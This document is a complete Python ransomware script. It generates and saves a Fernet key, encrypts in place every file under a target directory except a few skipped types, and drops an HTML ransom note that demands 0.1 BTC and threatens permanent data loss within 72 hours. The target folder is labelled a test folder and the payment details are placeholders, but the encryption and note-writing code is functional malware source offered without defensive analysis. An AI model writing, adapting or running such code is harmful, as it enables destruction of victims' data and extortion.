import os
from cryptography.fernet import Fernet
import hashlib
import random
import string

# === CONFIGURATION ===
TARGET_DIR = r"Ransomwares\Test Folder\Test"
KEY_FILE = "key.txt"
RANSOM_NOTE = "READ_ME.html"

# === STEP 1: Generate Random Key & Save It ===
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key

# === STEP 2: Create Non-Verifiable Hash ID ===
def create_hash_id(key):
    salt = os.urandom(16)
    hash_obj = hashlib.sha256(salt + key)
    return hash_obj.hexdigest()

# === STEP 3: Encrypt a Single File ===
def encrypt_file(file_path, fernet):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted)
        print(f"Encrypted: {file_path}")
    except Exception as e:
        print(f"[Error] {file_path}: {e}")

# === STEP 4: Walk Directory and Encrypt All Files ===
def encrypt_directory(target_dir, fernet):
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            file_path = os.path.join(root, file)

            # Skip key or ransom note to avoid self-encryption
            if file in [KEY_FILE, RANSOM_NOTE]:
                continue

            # Optional: skip .py or disguised .jpg/.exe file
            if file_path.endswith(".py") or file_path.endswith(".jpg") or file_path.endswith(".exe"):
                continue

            encrypt_file(file_path, fernet)

# === STEP 5: Write HTML Ransom Note ===
def write_ransom_note(ransom_id):
    html_content = f"""
    <html>
        <head><title>Your Files Are Encrypted</title></head>
        <body style="font-family: Arial; background-color: #111; color: #f33; text-align: center; padding-top: 100px;">
            <h1>💀 Your Files Have Been Encrypted 💀</h1>
            <p>Send 0.1 BTC to the following address: <b>1FakeBitcoinAddrXXXXXXXXXX</b></p>
            <p>Your Ransom ID: <code>{ransom_id}</code></p>
            <p>Email us at decryptmyfiles@fake-email.com with your ID after payment.</p>
            <p>Failure to do so in 72 hours will result in permanent data loss.</p>
        </body>
    </html>
    """
    with open(RANSOM_NOTE, "w") as f:
        f.write(html_content)
    print(f"Ransom note created: {RANSOM_NOTE}")

# === MAIN EXECUTION ===
def main():
    key = generate_key()
    ransom_id = create_hash_id(key)
    fernet = Fernet(key)

    encrypt_directory(TARGET_DIR, fernet)
    write_ransom_note(ransom_id)

if __name__ == "__main__":
    main()
